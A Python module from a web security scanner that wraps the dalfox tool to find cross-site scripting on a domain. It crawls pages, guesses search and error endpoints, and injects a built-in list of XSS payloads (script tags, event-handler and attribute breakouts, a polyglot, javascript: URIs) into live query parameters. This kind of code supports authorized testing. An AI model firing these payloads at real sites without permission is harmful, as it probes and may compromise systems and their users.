"""
xss - Reflected XSS scanner (dalfox wrapper).

Wraps dalfox (Go-based XSS scanner) for reflected/dom XSS detection.
Falls back to manual heuristic probing if dalfox binary is missing.

Usage:
  python matthunder_cli.py xss example.com
"""

import json
import os
import re
import shutil
import subprocess
from typing import Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import httpx

from . import SCANNER_REGISTRY
from .common import (
    resolve_tool,
    DEFAULT_TIMEOUT, USER_AGENT, canonical_url, crawl_domain,
    extract_anchors, finish_scan, host_in_scope, log, normalize_domain,
    open_db, utc_now_iso, merge_crawled_and_fallback, FALLBACK_PARAMS,
)


def _resolve(name: str) -> Optional[str]:
    return resolve_tool(name)


def _url_host(url: str) -> str:
    try:
        return urlparse(url).netloc.split(":")[0]
    except Exception:
        return ""


def _load_pipeline_urls() -> list[str]:
    """Load pre-discovered URLs from pipeline Phase 3."""
    url_file = os.environ.get("MT_PIPELINE_URLS", "")
    if url_file and os.path.exists(url_file):
        with open(url_file, encoding="utf-8", errors="ignore") as f:
            return [l.strip() for l in f if l.strip().startswith("http")]
    return []


# ── Manual XSS payloads for fallback when dalfox is missing ──────────────

XSS_PAYLOADS = [
    ('<script>alert(1)</script>', 'script_tag'),
    ('<img src=x onerror=alert(1)>', 'img_onerror'),
    ('<svg onload=alert(1)>', 'svg_onload'),
    ('" onfocus=alert(1) autofocus="', 'attr_inject'),
    ("' onfocus=alert(1) autofocus='", 'attr_inject_single'),
    ('<body onload=alert(1)>', 'body_onload'),
    ('<iframe src="javascript:alert(1)">', 'iframe_js'),
    ('"><script>alert(document.domain)</script>', 'breakout_double'),
    ("'><script>alert(document.domain)</script>", 'breakout_single'),
    ('<details open ontoggle=alert(1)>', 'details_toggle'),
    ('<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">', 'polyglot'),
    ('javascript:alert(1)', 'javascript_uri'),
    ('data:text/html,<script>alert(1)</script>', 'data_uri'),
    ('<a href="javascript:alert(1)">click</a>', 'anchor_js'),
    ('{{7*7}}', 'ssti_marker'),
    ('${7*7}', 'el_marker'),
    ('%3Cscript%3Ealert(1)%3C/script%3E', 'encoded_script'),
]

# ── Contexts where reflection is more dangerous ─────────────────────────

REFLECTION_PATTERNS = [
    (r'<script[^>]*>.*?{payload}.*?</script>', 'inside_script'),
    (r'on\w+\s*=\s*["\'].*?{payload}', 'inside_event_handler'),
    (r'href\s*=\s*["\'].*?{payload}', 'inside_href'),
    (r'src\s*=\s*["\'].*?{payload}', 'inside_src'),
    (r'["\'].*?{payload}.*?["\']', 'inside_attribute'),
]


def _manual_xss_probe(url: str, param: str, client: httpx.Client) -> list[dict]:
    """Manual XSS probing when dalfox is not available."""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if param not in qs:
        return []

    findings = []
    for payload, ptype in XSS_PAYLOADS:
        test_qs = dict(qs)
        test_qs[param] = [payload]
        new_query = urlencode(test_qs, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))

        try:
            r = client.get(test_url, timeout=DEFAULT_TIMEOUT, follow_redirects=True)
        except Exception:
            continue

        body = r.text or ""
        # Check if payload is reflected in response
        if payload in body and payload not in (url or ""):
            # Classify reflection context
            context = "reflected"
            for pattern, ctx_name in REFLECTION_PATTERNS:
                escaped = re.escape(payload)
                if re.search(pattern.replace("{payload}", escaped), body, re.I):
                    context = f"reflected_{ctx_name}"
                    break

            findings.append({
                "url": url,
                "param": param,
                "payload": payload,
                "type": context,
                "status": r.status_code,
            })
            break  # One finding per param is enough

    return findings


def run(domain: str, max_pages: int = 50) -> dict:
    domain = normalize_domain(domain)
    dalfox = _resolve("dalfox")

    con = open_db()
    scan_id = con.execute(
        "INSERT INTO scans (id, scanner, domain, params, status, created_at) "
        "VALUES (lower(hex(randomblob(16))), 'xss', ?, ?, 'running', ?)",
        (domain, "dalfox" if dalfox else "manual", utc_now_iso()),
    ).lastrowid
    con.commit()
    scan_id = con.execute("SELECT id FROM scans WHERE rowid=?", (scan_id,)).fetchone()["id"]
    log(con, scan_id, f"XSS scan started - domain: {domain} (mode: {'dalfox' if dalfox else 'manual'})")

    # Load pipeline URLs if available
    pipeline_urls = _load_pipeline_urls()
    all_urls = set()

    if pipeline_urls:
        log(con, scan_id, f"Using {len(pipeline_urls)} pre-discovered URLs from pipeline")
        all_urls.update(pipeline_urls)

    # Also crawl for more URLs
    pages = crawl_domain(domain, max_pages=max_pages)
    log(con, scan_id, f"Crawled {len(pages)} additional pages")
    for page_url, html in pages:
        for a in extract_anchors(html, page_url):
            if a["canonical"] and host_in_scope(_url_host(a["canonical"]), domain):
                all_urls.add(a["canonical"])
        if "?" in page_url:
            all_urls.add(page_url)

    # Add fallback endpoints with common XSS params
    base_urls = [f"https://{domain}", f"http://{domain}"]
    for base in base_urls:
        for endpoint in ["/search", "/api/search", "/q", "/find", "/error",
                         "/page", "/redirect", "/api/v1/search"]:
            for param in FALLBACK_PARAMS["xss"][:6]:
                all_urls.add(f"{base}{endpoint}?{param}=test")

    url_count = len(all_urls)
    findings: list[dict] = []

    if dalfox:
        # ── Dalfox mode ────────────────────────────────────────────────────
        url_file = f"_matthunder_xss_{scan_id}.txt"
        with open(url_file, "w", encoding="utf-8") as f:
            for u in all_urls:
                f.write(u + "\n")

        log(con, scan_id, f"Total URLs for dalfox: {url_count}")

        cmd = [dalfox, "file", url_file, "--silence", "--no-color", "--no-spinner",
               "--format", "json", "-o", f"_matthunder_xss_{scan_id}_out.json"]
        log(con, scan_id, "Running dalfox...")
        try:
            proc = subprocess.run(cmd, capture_output=True, encoding="utf-8", errors="replace", timeout=900)
        except subprocess.TimeoutExpired:
            proc = None
            log(con, scan_id, "dalfox timed out")
        except FileNotFoundError:
            proc = None
            log(con, scan_id, "dalfox binary not found at runtime")

        out_path = f"_matthunder_xss_{scan_id}_out.json"
        if os.path.exists(out_path):
            with open(out_path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        j = json.loads(line)
                    except Exception:
                        continue
                    findings.append({
                        "url": j.get("url") or j.get("data", ""),
                        "param": j.get("param", ""),
                        "payload": j.get("payload", ""),
                        "type": j.get("type", "reflected"),
                    })

        for p in (url_file, out_path):
            try:
                os.remove(p)
            except OSError:
                pass
    else:
        # ── Manual probing mode ────────────────────────────────────────────
        log(con, scan_id, f"dalfox not found — running manual XSS probe on {min(url_count, 100)} URLs")
        urls_with_params = [u for u in all_urls if "?" in u]
        if not urls_with_params:
            # Generate test URLs with common params
            for base in base_urls:
                for endpoint in ["/search", "/q", "/find", "/error", "/page",
                                 "/api/search", "/api/v1/search"]:
                    for param in FALLBACK_PARAMS["xss"][:4]:
                        urls_with_params.append(f"{base}{endpoint}?{param}=test")

        with httpx.Client(headers={"User-Agent": USER_AGENT}, follow_redirects=True, timeout=DEFAULT_TIMEOUT) as client:
            for url in urls_with_params[:100]:
                parsed = urlparse(url)
                params = list(parse_qs(parsed.query, keep_blank_values=True).keys())
                for param in params[:3]:
                    results = _manual_xss_probe(url, param, client)
                    for r in results:
                        log(con, scan_id, f"XSS found: {r['url']} param={r['param']} type={r['type']}")
                    findings.extend(results)

    log(con, scan_id, f"Found {len(findings)} XSS findings")

    for f in findings:
        con.execute(
            "INSERT INTO results (scan_id, category, target_url, status, detail, extracted_at) "
            "VALUES (?, ?, ?, ?, ?, ?)",
            (scan_id, f"xss_{f['type']}", f["url"], "vulnerable",
             f"param={f['param']} payload={f['payload'][:200]}", utc_now_iso()),
        )
    con.commit()
    finish_scan(con, scan_id, status="completed", total_sources=url_count, total_links=len(findings))
    con.close()
    return {"scan_id": scan_id, "scanner": "xss", "domain": domain, "pages": url_count, "findings": len(findings)}


SCANNER_REGISTRY["xss"] = run
